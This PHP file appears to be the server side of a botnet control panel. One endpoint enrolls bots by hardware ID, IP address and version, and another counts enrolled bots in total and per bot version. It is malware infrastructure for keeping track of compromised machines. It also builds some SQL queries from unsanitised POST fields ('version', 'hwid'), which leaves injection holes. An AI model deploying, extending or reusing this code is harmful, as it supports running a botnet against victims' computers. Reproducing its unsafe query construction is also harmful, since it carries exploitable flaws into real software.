<?php

include('inc/db.php');

$db = new PDO('mysql:host=localhost;dbname=dbname;charset=utf8', "dbuser", "pass");
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);


if(isset($_POST['hwid'])) {
    $hwid = $_POST['hwid'];
}
$ip   = $_SERVER['REMOTE_ADDR'];
$uri = $_SERVER['REQUEST_URI'];

// bot version
if(isset($_POST['version'])) {
    $version = $_POST['version'];
} else {
    $version = "1.0";
}


if(strpos($uri, "init")) {

    if(!isset($_POST['hwid'])) {

        echo "error";

    } else {

        if(getFromDatabase($hwid)) {

            $result = "SELECT * FROM bots WHERE hwid=:hwid";
            $other = [':hwid' => $hwid];
            $command = DB::query($result, $other);
            $data = $command[0];
            $curver = $data['version'];

            if($curver != $version ) {
                $uquery = "UPDATE bots SET version='$version' WHERE hwid=:hwid";
		        $udata = [':hwid' => $hwid];
                $search_command = DB::query($uquery, $udata);
            }

            echo "exists continue ".$curver;

        } else {

            $new_user = "INSERT INTO bots(hwid, ip, version) VALUES ('$hwid','$ip', '$version')";
            $data = DB::query($new_user);
            echo "created continue";

        }

    }

}

if(strpos($uri, "count")) { // total bots

    if(isset($_POST['yeet'])) {
        $result = $db->prepare("SELECT SQL_CALC_FOUND_ROWS id FROM bots"); 
        $result->execute();
        $result = $db->prepare("SELECT FOUND_ROWS()"); 
        $result->execute();
        $row_count = $result->fetchColumn();
        $total = $row_count;
        echo $total;
    }

    if(isset($_POST['type'])) {

        $bottype = $_POST['bot'];

        if($bottype == "1.2.0") {
            $result = $db->prepare("SELECT SQL_CALC_FOUND_ROWS id FROM bots WHERE `version` = '1.2.0'"); 
            $result->execute();
            $result = $db->prepare("SELECT FOUND_ROWS()"); 
            $result->execute();
            $row_count = $result->fetchColumn();
            $total = $row_count;
            echo $total;
        } else if($bottype == "1.2.1") {
            $result = $db->prepare("SELECT SQL_CALC_FOUND_ROWS id FROM bots WHERE `version` = '1.2.1'"); 
            $result->execute();
            $result = $db->prepare("SELECT FOUND_ROWS()"); 
            $result->execute();
            $row_count = $result->fetchColumn();
            $total = $row_count;
            echo $total;
        }

    }
    
}































function getFromDatabase($data) {
    $user_query = 'SELECT * FROM bots WHERE hwid=:hwid';
    $user_data = [':hwid' => $data];
    $search_user = DB::query($user_query, $user_data);

	return $search_user;
}



?>